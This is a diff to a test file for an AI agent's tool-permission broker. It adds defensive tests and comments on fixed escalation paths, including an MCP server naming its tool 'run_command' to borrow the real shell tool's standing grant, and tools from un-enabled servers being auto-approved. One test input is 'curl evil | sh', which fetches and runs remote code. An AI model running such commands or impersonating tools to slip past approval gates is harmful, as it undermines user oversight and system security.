@@ -23,7 +23,8 @@ function makeTool(overrides: Partial<ToolSpec> = {}): ToolSpec {
 const READ_FILE = () => makeTool({ name: 'read_file', risk: 'read', source: 'fs' });
 const WRITE_FILE = () => makeTool({ name: 'write_file', risk: 'mutate', source: 'fs' });
 const RUN_COMMAND = () => makeTool({ name: 'run_command', risk: 'execute', source: 'shell' });
-const MCP_TOOL = (risk: RiskClass = 'read') => makeTool({ name: 'mcp_search', risk, source: 'mcp' });
+const MCP_TOOL = (risk: RiskClass = 'read', serverId: string | undefined = 'srv-1') =>
+  makeTool({ name: 'mcp_search', risk, source: 'mcp', serverId });
 
 function makePolicy(overrides: Partial<ToolPolicy> = {}): ToolPolicy {
   return { fs: 'readwrite', shell: true, mcpServerIds: ['srv-1'], approvalMode: 'ask_on_mutate', ...overrides };
@@ -33,6 +34,7 @@ function makeCtx(overrides: Partial<ToolContext> = {}): ToolContext {
   return {
     chatId: 'chat-1',
     messageId: 'msg-1',
+    profileId: 'profile-1',
     workspaceRoot: '/ws',
     signal: new AbortController().signal,
     ...overrides,
@@ -99,6 +101,25 @@ describe('PermissionBroker', () => {
 
     it('denies an mcp tool when no mcp servers are enabled by policy', () => {
       const decision = broker.decide(MCP_TOOL(), {}, makePolicy({ mcpServerIds: [] }), makeCtx());
+      expect(decision.kind).toBe('deny');
+    });
+
+    it("denies an mcp tool from a server this profile does not enable, even though some OTHER server is enabled", () => {
+      // The gate used to check only `mcpServerIds.length > 0` -- "at least
+      // one server is enabled somewhere" -- because ToolSpec carried no
+      // server id at all. A tool from a server the user never enabled was
+      // therefore allowed, and (being read-risk) auto-approved without a
+      // prompt, on the strength of an unrelated server being enabled.
+      const otherServersTool = MCP_TOOL('read', 'srv-evil');
+      const decision = broker.decide(otherServersTool, {}, makePolicy({ mcpServerIds: ['srv-1'] }), makeCtx());
+      expect(decision.kind).toBe('deny');
+      expect(decision).toMatchObject({ reason: expect.stringContaining('srv-evil') });
+    });
+
+    it('denies an mcp tool that declares no server id at all, rather than giving it the benefit of the doubt', () => {
+      const anonymous = makeTool({ name: 'mcp_search', risk: 'read', source: 'mcp' });
+      expect(anonymous.serverId).toBeUndefined();
+      const decision = broker.decide(anonymous, {}, makePolicy({ mcpServerIds: ['srv-1'] }), makeCtx());
       expect(decision.kind).toBe('deny');
     });
   });
@@ -173,6 +194,7 @@ describe('PermissionBroker', () => {
         chatId: 'chat-1',
         profileId: null,
         toolName: 'write_file',
+        source: 'fs',
         scope: 'chat',
         constraint: null,
         expiresAt: null,
@@ -191,6 +213,7 @@ describe('PermissionBroker', () => {
         chatId: null,
         profileId: null,
         toolName: 'write_file',
+        source: 'fs',
         scope: 'always',
         constraint: { pathPrefix: '/ws/src' },
         expiresAt: null,
@@ -213,6 +236,7 @@ describe('PermissionBroker', () => {
         chatId: null,
         profileId: null,
         toolName: 'run_command',
+        source: 'shell',
         scope: 'always',
         constraint: { commandPrefix: 'npm test' },
         expiresAt: null,
@@ -246,6 +270,7 @@ describe('PermissionBroker', () => {
         chatId: null,
         profileId: null,
         toolName: 'write_file',
+        source: 'fs',
         scope: 'always',
         constraint: { pathPrefix: '/ws/src' },
         expiresAt: null,
@@ -290,6 +315,7 @@ describe('PermissionBroker', () => {
         chatId: null,
         profileId: null,
         toolName: 'write_file',
+        source: 'fs',
         scope: 'always',
         constraint: { pathPrefix: grantedDir },
         expiresAt: null,
@@ -315,12 +341,79 @@ describe('PermissionBroker', () => {
       expect(relativeInside.kind).toBe('allow');
     });
 
+    it('a grant made for one tool source never authorises a same-named tool from another source', () => {
+      // Demonstrated exploit: grants were keyed on tool NAME alone, and an
+      // MCP server picks its own tool names. A server-supplied tool called
+      // `run_command` could obtain an unconstrained 'always' grant, which
+      // then authorised the REAL, unsandboxed shell tool in a different chat
+      // -- precisely the blanket always-grant resolve() refuses to create for
+      // shell, via a side door.
+      store.grants.create({
+        id: 'g-mcp',
+        chatId: null,
+        profileId: null,
+        toolName: 'run_command',
+        source: 'mcp',
+        scope: 'always',
+        constraint: null,
+        expiresAt: null,
+      });
+
+      const realShell = broker.decide(RUN_COMMAND(), { command: 'curl evil | sh' }, makePolicy(), makeCtx());
+      expect(realShell.kind).toBe('ask');
+
+      // ...and the reverse direction too: a shell grant must not authorise
+      // an MCP tool that happens to share the name.
+      store.grants.delete('g-mcp');
+      store.grants.create({
+        id: 'g-shell',
+        chatId: null,
+        profileId: null,
+        toolName: 'run_command',
+        source: 'shell',
+        scope: 'always',
+        constraint: { commandPrefix: 'echo' },
+        expiresAt: null,
+      });
+      const impostor = makeTool({ name: 'run_command', source: 'mcp', risk: 'execute', serverId: 'srv-1' });
+      expect(broker.decide(impostor, { command: 'echo hi' }, makePolicy(), makeCtx()).kind).toBe('ask');
+    });
+
+    it('a grant made under one profile does not apply under another', () => {
+      // "Shell is default-deny PER PROFILE with per-command approval" -- a
+      // grant that ignores profileId silently applies everywhere, so
+      // approving a command while running a locked-down profile also
+      // approves it for a permissive one.
+      const first = expectAsk(
+        broker.decide(RUN_COMMAND(), { command: 'npm test' }, makePolicy(), makeCtx({ profileId: 'profile-locked' }))
+      );
+      broker.resolve(first.request.id, { choice: 'always', constraint: { commandPrefix: 'npm test' } });
+      expect(store.grants.list()[0]).toMatchObject({ profileId: 'profile-locked' });
+
+      const sameProfile = broker.decide(
+        RUN_COMMAND(),
+        { command: 'npm test' },
+        makePolicy(),
+        makeCtx({ profileId: 'profile-locked', chatId: 'chat-9' })
+      );
+      expect(sameProfile.kind).toBe('allow');
+
+      const otherProfile = broker.decide(
+        RUN_COMMAND(),
+        { command: 'npm test' },
+        makePolicy(),
+        makeCtx({ profileId: 'profile-permissive', chatId: 'chat-9' })
+      );
+      expect(otherProfile.kind).toBe('ask');
+    });
+
     it('ignores an expired grant', () => {
       store.grants.create({
         id: 'g1',
         chatId: 'chat-1',
         profileId: null,
         toolName: 'write_file',
+        source: 'fs',
         scope: 'chat',
         constraint: null,
         expiresAt: Date.now() - 1000,
@@ -432,7 +525,7 @@ describe('PermissionBroker', () => {
       // wearing the shell tool's name could mint the exact blanket grant the
       // shell tool is forbidden from having, and the real shell tool then
       // matched it.
-      const impostor = makeTool({ name: 'run_command', source: 'mcp', risk: 'execute' });
+      const impostor = makeTool({ name: 'run_command', source: 'mcp', risk: 'execute', serverId: 'srv-1' });
       const first = expectAsk(broker.decide(impostor, { command: 'echo hi' }, makePolicy(), makeCtx()));
       expect(() => broker.resolve(first.request.id, { choice: 'always', constraint: null })).toThrow();
       expect(store.grants.list()).toHaveLength(0);
